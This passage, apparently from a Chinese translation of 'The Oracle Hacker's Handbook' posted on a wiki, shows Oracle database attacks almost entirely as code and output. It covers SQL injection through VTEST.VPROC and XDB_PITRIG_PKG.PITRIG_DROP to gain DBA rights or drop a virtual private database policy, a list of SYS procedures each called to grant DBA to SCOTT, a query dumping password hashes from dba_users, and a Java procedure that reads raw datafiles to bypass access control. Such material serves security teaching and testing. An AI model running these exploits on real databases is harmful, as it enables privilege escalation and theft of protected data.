SYS.SPROC 过程访问视图时，将执行此函数，授予我们 DBA 权限：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">connect scott/tiger</span><br><span class="line"></span><br><span class="line">-- create the function that will be called from the view</span><br><span class="line">-- and grants us DBA privileges</span><br><span class="line"></span><br><span class="line">create or replace function get_dba return number authid current_user is</span><br><span class="line">pragma autonomous_transaction;</span><br><span class="line">begin</span><br><span class="line">execute immediate &#x27;grant dba to scott&#x27;;</span><br><span class="line">commit;</span><br><span class="line">return 1;</span><br><span class="line">end;</span><br><span class="line">/</span><br><span class="line">grant execute on get_dba to public;</span><br><span class="line"></span><br><span class="line">-- create the function that we&#x27;ll inject into VTEST.VPROC</span><br><span class="line">-- and creates a view in the SYSTEM schema which calls</span><br><span class="line">-- our get_dba function</span><br><span class="line"></span><br><span class="line">create or replace function create_the_view return number authid</span><br><span class="line">current_user is</span><br><span class="line"></span><br><span class="line">pragma autonomous_transaction;</span><br><span class="line">begin</span><br><span class="line">execute immediate &#x27;create or replace view system.the_sysview (val) as</span><br><span class="line">select 1 from dual where scott.get_dba()=1&#x27;;</span><br><span class="line">commit;</span><br><span class="line">return 1;</span><br><span class="line">end;</span><br><span class="line">/</span><br><span class="line">grant execute on create_the_view to public;</span><br><span class="line"></span><br><span class="line">-- now inject the create_the_view function into VTEST.VPROC</span><br><span class="line"></span><br><span class="line">exec vtest.vproc(&#x27;ALL_OBJECTS where scott.create_the_view() = 1--&#x27;);</span><br><span class="line"></span><br><span class="line">-- The view should now be created</span><br><span class="line">-- All that&#x27;s left to do is get our dba privs</span><br><span class="line"></span><br><span class="line">exec sys.sproc(&#x27;SYSTEM.THE_SYSVIEW&#x27;);</span><br><span class="line"></span><br><span class="line">-- now claim our newly issued privileges</span><br><span class="line">set role dba</span><br><span class="line">-- and use them</span><br><span class="line">select username, password from sys.dba_users;</span><br></pre></td></tr></table></figure><p><img src="/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/The-Oracle-Hacker-s-Handbook-Hacking-and-Defending-Oracle-%E4%B8%8B%E7%AF%87/9.png"></p><h3 id="从EXECUTE-ANY-PROCEDURE获取DBA"><a href="#从EXECUTE-ANY-PROCEDURE获取DBA" class="headerlink" title="从EXECUTE ANY PROCEDURE获取DBA"></a>从EXECUTE ANY PROCEDURE获取DBA</h3><p>我几乎不需要解释这一点。 毋庸置疑，当拥有此权限的用户可以找到 SYS 拥有的执行任意 SQL 的过程时，他们可以立即获得 DBA。 有很多这样的程序，如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">EXEC SYS.LTADM.EXECSQL(&#x27;GRANT DBA TO SCOTT&#x27;);</span><br><span class="line">EXEC SYS.LTADM.EXECSQLAUTO(&#x27;GRANT DBA TO SCOTT&#x27;);</span><br><span class="line">EXEC SYS.DBMS_PRVTAQIM.EXECUTE_STMT(&#x27;GRANT DBA TO SCOTT&#x27;);</span><br><span class="line">EXEC SYS.DBMS_STREAMS_RPC.EXECUTE_STMT(&#x27;GRANT DBA TO SCOTT&#x27;);</span><br><span class="line">EXEC SYS.DBMS_AQADM_SYS.EXECUTE_STMT(&#x27;GRANT DBA TO SCOTT&#x27;);</span><br><span class="line">EXEC SYS.DBMS_STREAMS_ADM_UTL.EXECUTE_SQL_STRING(&#x27;GRANT DBA TO SCOTT&#x27;);</span><br><span class="line">EXEC INITJVMAUX.EXEC(&#x27;GRANT DBA TO SCOTT&#x27;,TRUE);</span><br><span class="line">EXEC SYS.DBMS_REPACT_SQL_UTL.DO_SQL(&#x27;GRANT DBA TO SCOTT&#x27;,TRUE);</span><br><span class="line">EXEC SYS.DBMS_AQADM_SYSCALLS.KWQA_3GL_EXECUTESTMT(&#x27;begin null; end;&#x27;);</span><br></pre></td></tr></table></figure><h3 id="从CREATE-PROCEDURE获取DBA"><a href="#从CREATE-PROCEDURE获取DBA" class="headerlink" title="从CREATE PROCEDURE获取DBA"></a>从CREATE PROCEDURE获取DBA</h3><p>好的 - 这就是问题所在。 我们在一个只有很少权限的用户拥有的包中发现了一个 SQL 注入缺陷。 OLAPSYS、MDSYS、DBSNMP 和 ORDSYS 等帐户被授予创建过程权限。 因此，如果他们更改了其他人拥有的另一个过程所依赖的一个过程，那么他们就可以开始以该其他用户的身份执行代码。 如果该用户不是 DBA，那么您至少更近了一步。 例如，SYS 拥有的 VALIDATE_CONTEXT 过程依赖于 CTXSYS 拥有的 DRUE 包。 如果 CTXSYS 更改此包并将漏洞利用代码放入其中，则 CTXSYS 可以获得 DBA 权限。 因此，如果 CTXSYS 拥有一个容易受到 SQL 注入攻击的 PUBLIC 可执行过程，那么就有可能获得 DBA 特权。 碰巧的是，在 10g 第 2 版 CTXSYS 上没有此特权，但您明白了。 要查看哪个过程取决于什么，请检查 DBA_DEPENDENCIES 视图。</p><h2 id="攻击虚拟专用数据库"><a href="#攻击虚拟专用数据库" class="headerlink" title="攻击虚拟专用数据库"></a>攻击虚拟专用数据库</h2><p>本章假设您了解虚拟专用数据库 (VPD)。 如果您不了解，我推荐 David Knox 的 Effective Oracle Database 10g Security by Design（McGraw-Hill，2004 年）。 简而言之，VPD 是 Oracle 内置的一种安全机制，它允许细粒度的访问控制。 它用于强制执行安全策略。 本质上，VPD 只允许用户访问策略指定他们可以访问的数据，而不能访问更多数据。 但是，有多种方法可以攻击 VPD。 本章看几个。</p><h3 id="欺骗-Oracle-删除策略"><a href="#欺骗-Oracle-删除策略" class="headerlink" title="欺骗 Oracle 删除策略"></a>欺骗 Oracle 删除策略</h3><p>VPD 是使用 DBMS_RLS 包创建的。 也可以使用 DBMS_FGA 包——它们的作用完全相同。 顺便提一下，RLS 代表行级安全，而 FGA 代表细粒度访问。 如果我们想看看谁可以执行这个包，我们得到以下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; select grantee,privilege from dba_tab_privs where table_name</span><br><span class="line">=&#x27;DBMS_RLS&#x27;;</span><br><span class="line"></span><br><span class="line">GRANTEE                  PRIVILEGE</span><br><span class="line">------------------------------</span><br><span class="line">EXECUTE_CATALOG_ROLE      EXECUTE</span><br><span class="line"></span><br><span class="line">XDB                        EXECUTE</span><br><span class="line">WKSYS                        EXECUTE</span><br><span class="line">SQL&gt; select grantee,privilege from dba_tab_privs where table_name</span><br><span class="line">=&#x27;DBMS_FGA&#x27;;</span><br><span class="line"></span><br><span class="line">GRANTEE                  PRIVILEGE</span><br><span class="line">------------------------------</span><br><span class="line">EXECUTE_CATALOG_ROLE      EXECUTE</span><br></pre></td></tr></table></figure><p>综上所述，如果我们可以将代码作为 XDB 或 WKSYS 执行，那么我们就可以操纵 RLS 策略。 在开始之前，让我们设置一个简单的 VPD。 首先，创建将拥有 VPD 的用户：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; CONNECT / AS SYSDBA</span><br><span class="line">Connected.</span><br><span class="line">SQL&gt; CREATE USER VPD IDENTIFIED BY PASS123;</span><br><span class="line"></span><br><span class="line">User created.</span><br><span class="line"></span><br><span class="line">SQL&gt; GRANT CREATE SESSION TO VPD;</span><br><span class="line"></span><br><span class="line">Grant succeeded.</span><br><span class="line"></span><br><span class="line">SQL&gt; GRANT CREATE TABLE TO VPD;</span><br><span class="line"></span><br><span class="line">Grant succeeded.</span><br><span class="line"></span><br><span class="line">SQL&gt; GRANT CREATE PROCEDURE TO VPD;</span><br><span class="line"></span><br><span class="line">SQL&gt; GRANT UNLIMITED TABLESPACE TO VPD;</span><br><span class="line"></span><br><span class="line">Grant succeeded.</span><br><span class="line"></span><br><span class="line">SQL&gt; GRANT EXECUTE ON DBMS_RLS TO VPD;</span><br><span class="line"></span><br><span class="line">Grant succeeded.</span><br></pre></td></tr></table></figure><p>完成后，我们可以设置一个表用作 VPD。 在这个例子中，我们将创建一个存储army订单的表：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; CONNECT VPD/PASS123</span><br><span class="line">Connected.</span><br><span class="line">SQL&gt; CREATE TABLE VPDTESTTABLE (CLASSIFICATION VARCHAR2(20),</span><br><span class="line">  2 ORDER_TEXT VARCHAR(20), RANK VARCHAR2(20));</span><br><span class="line"></span><br><span class="line">Table created.</span><br><span class="line"></span><br><span class="line">SQL&gt; GRANT SELECT ON VPDTESTTABLE TO PUBLIC;</span><br><span class="line"></span><br><span class="line">Grant succeeded.</span><br><span class="line"></span><br><span class="line">SQL&gt; INSERT INTO VPDTESTTABLE (CLASSIFICATION, ORDER_TEXT, RANK) VALUES</span><br><span class="line">(&#x27;SECRET&#x27;,&#x27;CAPTURE ENEMY BASE&#x27;,&#x27;GENERAL&#x27;);</span><br><span class="line"></span><br><span class="line">1 row created.</span><br><span class="line"></span><br><span class="line">SQL&gt; INSERT INTO VPDTESTTABLE (CLASSIFICATION, ORDER_TEXT, RANK)</span><br><span class="line">VALUES(&#x27;UNCLASSIFIED&#x27;,&#x27;UPDATE DUTY ROTA&#x27;,&#x27;CORPORAL&#x27;);</span><br><span class="line"></span><br><span class="line">1 row created.</span><br><span class="line"></span><br><span class="line">SQL&gt; INSERT INTO VPDTESTTABLE (CLASSIFICATION, ORDER_TEXT, RANK)</span><br><span class="line">VALUES(&#x27;SECRET&#x27;,&#x27;INVADE ON TUESDAY&#x27;,&#x27;COLONEL&#x27;);</span><br><span class="line"></span><br><span class="line">1 row created.</span><br><span class="line"></span><br><span class="line">SQL&gt; INSERT INTO VPDTESTTABLE (CLASSIFICATION, ORDER_TEXT, RANK)</span><br><span class="line">VALUES(&#x27;UNCLASSIFIED&#x27;,&#x27;POLISH BOOTS&#x27;,&#x27;MAJOR&#x27;);</span><br><span class="line"></span><br><span class="line">1 row created.</span><br></pre></td></tr></table></figure><p>在设置 VPD 之前，因为我们已授予 PUBLIC 执行权限，任何人都可以访问标记为 SECRET 的订单：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; CONNECT SCOTT/TIGER</span><br><span class="line">Connected.</span><br><span class="line">SQL&gt; SELECT * FROM VPD.VPDTESTTABLE;</span><br><span class="line"></span><br><span class="line">CLASSIFICATION       ORDER_TEXT           RANK</span><br><span class="line">-------------------- -------------------- ---------</span><br><span class="line">SECRET               CAPTURE ENEMY BASE   GENERAL</span><br><span class="line">UNCLASSIFIED         UPDATE DUTY ROTA     CORPORAL</span><br><span class="line">SECRET               INVADE ON TUESDAY    COLONEL</span><br><span class="line">UNCLASSIFIED         POLISH BOOTS         MAJOR</span><br></pre></td></tr></table></figure><p>我们将设置一个虚拟专用数据库来防止这种情况。 首先，我们创建一个返回谓词的函数——本质上是一个 where 子句，它被附加到对表的查询的末尾：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; CONNECT VPD/PASS123</span><br><span class="line">Connected.</span><br><span class="line">SQL&gt; CREATE OR REPLACE FUNCTION HIDE_SECRET_ORDERS(p_schema IN</span><br><span class="line">VARCHAR2,p_object IN VARCHAR2)</span><br><span class="line">  2  RETURN VARCHAR2</span><br><span class="line">  3  AS</span><br><span class="line">  4  BEGIN</span><br><span class="line">  5  RETURN &#x27;CLASSIFICATION !=&#x27;&#x27;SECRET&#x27;&#x27;&#x27;;</span><br><span class="line">  6  END;</span><br><span class="line"></span><br><span class="line">  7  /</span><br><span class="line"></span><br><span class="line">Function created.</span><br></pre></td></tr></table></figure><p>创建函数后，现在可以使用它来执行策略 - 我们将其称为 SECRECY：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; BEGIN</span><br><span class="line">  2  DBMS_RLS.add_policy</span><br><span class="line">  3  (object_schema    =&gt; &#x27;VPD&#x27;,</span><br><span class="line">  4  object_name      =&gt; &#x27;VPDTESTTABLE&#x27;,</span><br><span class="line">  5  policy_name      =&gt; &#x27;SECRECY&#x27;,</span><br><span class="line">  6  policy_function  =&gt; &#x27;HIDE_SECRET_ORDERS&#x27;);</span><br><span class="line">  7  END;</span><br><span class="line">  8  /</span><br><span class="line"></span><br><span class="line">PL/SQL procedure successfully completed.</span><br></pre></td></tr></table></figure><p>现在，如果我们以 SCOTT 的身份重新连接并从此表中选择，我们将只会看到non-secret 订单：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; CONNECT SCOTT/TIGER</span><br><span class="line">Connected.</span><br><span class="line">SQL&gt; SELECT * FROM VPD.VPDTESTTABLE;</span><br><span class="line"></span><br><span class="line">CLASSIFICATION       ORDER_TEXT           RANK</span><br><span class="line">-------------------- -------------------- --------------</span><br><span class="line">UNCLASSIFIED         UPDATE DUTY ROTA     CORPORAL</span><br><span class="line">UNCLASSIFIED         POLISH BOOTS         MAJOR</span><br></pre></td></tr></table></figure><p>是时候再次访问了……</p><p>早些时候有人指出 XDB 可以执行 DBMS_RLS 包。 从理论上讲，如果我们能在 XDB 拥有的任何包中发现缺陷，我们就可以利用它来删除策略。 在寻找这样一个缺陷以将理论变为实际之后，我们在 DB_PITRIG_PKG 包中遇到了一个 - SQL 注入缺陷：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; CONNECT SCOTT/TIGER</span><br><span class="line">Connected.</span><br><span class="line">SQL&gt; SELECT * FROM VPD.VPDTESTTABLE;</span><br><span class="line"></span><br><span class="line">CLASSIFICATION       ORDER_TEXT           RANK</span><br><span class="line">-------------------- -------------------- --------------</span><br><span class="line">UNCLASSIFIED         UPDATE DUTY ROTA     CORPORAL</span><br><span class="line">UNCLASSIFIED         POLISH BOOTS         MAJOR</span><br><span class="line"></span><br><span class="line">SQL&gt; CREATE OR REPLACE FUNCTION F RETURN NUMBER AUTHID CURRENT_USER IS</span><br><span class="line">  2  PRAGMA AUTONOMOUS_TRANSACTION;</span><br><span class="line"></span><br><span class="line">  3  BEGIN</span><br><span class="line">  4  DBMS_OUTPUT.PUT_LINE(&#x27;HELLO&#x27;);</span><br><span class="line">  5  EXECUTE IMMEDIATE &#x27;BEGIN</span><br><span class="line">SYS.DBMS_RLS.DROP_POLICY(&#x27;&#x27;VPD&#x27;&#x27;,&#x27;&#x27;VPDTESTTABLE&#x27;&#x27;,&#x27;&#x27;SECRECY&#x27;&#x27;); END;&#x27;;</span><br><span class="line">  6  RETURN 1;</span><br><span class="line">  7  COMMIT;</span><br><span class="line">  8  END;</span><br><span class="line">  9  /</span><br><span class="line"></span><br><span class="line">Function created.</span><br><span class="line"></span><br><span class="line">SQL&gt; CREATE TABLE FOO (X NUMBER);</span><br><span class="line"></span><br><span class="line">SQL&gt; EXEC XDB.XDB_PITRIG_PKG.PITRIG_DROP(&#x27;SCOTT&quot;.&quot; FOO&quot; WHERE</span><br><span class="line">1=SCOTT.F()--&#x27;,&#x27;BBBB&#x27;);</span><br><span class="line"></span><br><span class="line">PL/SQL procedure successfully completed.</span><br><span class="line"></span><br><span class="line">SQL&gt; SELECT * FROM VPD.VPDTESTTABLE;</span><br><span class="line"></span><br><span class="line">CLASSIFICATION       ORDER_TEXT           RANK</span><br><span class="line">-------------------- -------------------- --------------------</span><br><span class="line">SECRET               CAPTURE ENEMY BASE   GENERAL</span><br><span class="line">UNCLASSIFIED         UPDATE DUTY ROTA     CORPORAL</span><br><span class="line">SECRET               INVADE ON TUESDAY    COLONEL</span><br><span class="line">UNCLASSIFIED         POLISH BOOTS         MAJOR</span><br><span class="line"></span><br><span class="line">SQL&gt;</span><br></pre></td></tr></table></figure><p>现在我们可以再次访问SECRECY订单。 那么这里发生了什么？ XDB_PITRIG_PKG 包的 PITRIG_DROP 过程容易受到 SQL 注入的影响，并且由于该包可由 PUBLIC 执行，因此任何人都可以作为 XDB 执行 SQL。 我们创建了一个名为 F 的函数，它执行以下操作：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BEGIN</span><br><span class="line"></span><br><span class="line">SYS.DBMS_RLS.DROP_POLICY(&#x27;VPD&#x27;,&#x27;VPDTESTTABLE&#x27;,&#x27;SECRECY&#x27;);</span><br><span class="line"></span><br><span class="line">END;</span><br></pre></td></tr></table></figure><p>这会从 VPDTESTTABLE 中删除 SECRECY 策略。 然后我们将此函数注入到 XDB_PITRIG_PKG.PITRIG_DROP 中，它以 XDB 权限执行，从而删除策略并让我们再次访问秘密数据。 此外，创建 FOO 表并将其保留为空以停止“ORA-31007：尝试删除非空容器”错误，如果我们使用例如 SCOTT.EMP，我们会得到该错误。 坦率地说，SYS 拥有的定义者权限包中的任何 SQL 注入缺陷都会同样有效 - 但这一点已经得到了解决。 如果您不知道 VPDTESTTABLE 上的策略名称，则可以从 ALL_POLICIES 视图中获取此信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; select OBJECT_OWNER, OBJECT_NAME, POLICY_NAME FROM ALL_POLICIES;</span><br><span class="line"></span><br><span class="line">OBJECT_OWNER      OBJECT_NAME            POLICY_NAME</span><br><span class="line">------------       -----------            -------------</span><br><span class="line">VPD               VPDTESTTABLE              SECRECY</span><br></pre></td></tr></table></figure><h3 id="使用原始文件访问攻击VPD"><a href="#使用原始文件访问攻击VPD" class="headerlink" title="使用原始文件访问攻击VPD"></a>使用原始文件访问攻击VPD</h3><p>您可以通过访问原始数据文件本身来完全绕过数据库强制访问控制。 这在第 11 章中有完整的介绍——但现在是代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">SET ESCAPE ON</span><br><span class="line">SET ESCAPE &quot;\&quot;</span><br><span class="line">SET SERVEROUTPUT ON</span><br><span class="line"></span><br><span class="line">CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED &quot;JAVAREADBINFILE&quot; AS</span><br><span class="line">import java.lang.*;</span><br><span class="line">import java.io.*;</span><br><span class="line"></span><br><span class="line">public class JAVAREADBINFILE</span><br><span class="line">&#123;</span><br><span class="line">        public static void readbinfile(String f, int start) throws</span><br><span class="line">IOException</span><br><span class="line">      &#123;</span><br><span class="line">             FileInputStream fis;</span><br><span class="line">            DataInputStream dis;</span><br><span class="line">            try</span><br><span class="line">            &#123;</span><br><span class="line">                  int i;</span><br><span class="line">                  int ih,il;</span><br><span class="line">                  int cnt = 1, h=0,l=0;</span><br><span class="line">                  String hex[] = &#123;&quot;0&quot;, &quot;1&quot;, &quot;2&quot;,&quot;3&quot;, &quot;4&quot;, &quot;5&quot;, &quot;6&quot;, &quot;7&quot;,</span><br><span class="line">&quot;8&quot;,&quot;9&quot;, &quot;A&quot;, &quot;B&quot;, &quot;C&quot;, &quot;D&quot;, &quot;E&quot;,&quot; F&quot;&#125;;</span><br><span class="line"></span><br><span class="line">                  RandomAccessFile raf = new RandomAccessFile (f, &quot;r&quot;);</span><br><span class="line">                  raf.seek (start);</span><br><span class="line">                  for(i=0; i&lt;=512; i++)</span><br><span class="line">                  &#123;</span><br><span class="line">                        ih = il = raf.readByte() \&amp; 0xFF;</span><br><span class="line">                        h = ih &gt;&gt; 4;</span><br><span class="line"></span><br><span class="line">                           l = il \&amp; 0x0F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                           System.out.print(&quot;\\\\x&quot; + hex[h] + hex[l]);</span><br><span class="line">                           if(cnt \% 16 == 0)</span><br><span class="line">                                 System.out.println();</span><br><span class="line">                           cnt ++;</span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">             catch (EOFException eof)</span><br><span class="line">                   &#123;</span><br><span class="line">                   System.out.println();</span><br><span class="line">                   System.out.println(&quot;EOF reached &quot;);</span><br><span class="line">             &#125;</span><br><span class="line">             catch (IOException ioe)</span><br><span class="line">             &#123;</span><br><span class="line">                   System.out.println(&quot;IO error: &quot;+ ioe);</span><br><span class="line">             &#125;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br><span class="line">/</span><br><span class="line">show errors</span><br><span class="line">/</span><br><span class="line">CREATE OR REPLACE PROCEDURE JAVAREADBINFILEPROC (p_filename  IN</span><br><span class="line">VARCHAR2, p_start in number)</span><br><span class="line">AS LANGUAGE JAVA</span><br><span class="line">NAME &#x27;JAVAREADBINFILE.readbinfile (java.lang.String, int)&#x27;;</span><br><span class="line">/</span><br><span class="line">show errors</span><br><span class="line">/</span><br></pre></td></tr></table></figure><p>创建后，您可以使用它直接读取文件 - 在这种情况下， VPDTESTTABLE 存在于 USERS 表空间中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; set serveroutput on</span><br><span class="line">SQL&gt; exec dbms_java.set_output(2000);</span><br><span class="line">PL/SQL procedure successfully completed.</span><br><span class="line">SQL&gt; exec</span><br><span class="line">JAVAREADBINFILEPROC(&#x27;c:\\oracle\\oradata\\orcl10G\\USERS01.DBF&#x27;,3129184)</span><br><span class="line">;</span><br><span class="line">\x03\x1B\x01\x80\x02\x02\x2C\x01\x03\x0C\x55\x4E\x43\x4C\x41\x53</span><br><span class="line">\x53\x49\x46\x49\x45\x44\x0C\x50\x4F\x4C\x49\x53\x48\x20\x42\x4F</span><br><span class="line">\x4F\x54\x53\x05\x4D\x41\x4A\x4F\x52\x2C\x01\x03\x06\x53\x45\x43</span><br><span class="line">\x52\x45\x54\x11\x49\x4E\x56\x41\x44\x45\x20\x4F\x4E\x20\x54\x55</span><br><span class="line">\x45\x53\x44\x41\x59\x07\x43\x4F\x4C\x4F\x4E\x45\x4C\x2C\x01\x03</span><br><span class="line">\x0C\x55\x4E\x43\x4C\x41\x53\x53\x49\x46\x49\x45\x44\x10\x55\x50</span><br><span class="line"></span><br><span class="line">\x44\x41\x54\x45\x20\x44\x55\x54\x59\x20\x52\x4F\x54\x41\x08\x43</span><br><span class="line">\x4F\x52\x50\x4F\x52\x41\x4C\x2C\x01\x03\x06\x53\x45\x43\x52\x45</span><br><span class="line">\x54\x12\x43\x41\x50\x54\x55\x52\x45\x20\x45\x4E\x45\x4D\x59\x20</span><br><span class="line">\x42\x41\x53\x45\x07\x47\x45\x4E\x45\x52\x41\x4C\x06\x06\x1E\xE2</span><br><span class="line">\x06\xA2\x00\x00\x7E\x01\x00\x01\x1E\xE2\x1F\x00\x00\x00\x01\x04</span><br><span class="line">\xBE\x1E\x00\x00\x01\x00\x0B\x00\x17\xCB\x00\x00\x01\xE2\x1F\x00</span><br><span class="line">..</span><br><span class="line">..</span><br></pre></td></tr></table></figure><p>PL/SQL 过程成功完成。 此输出包含加密数据 - 例如，从第 3 行的最后三个字节开始，我们有以下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span 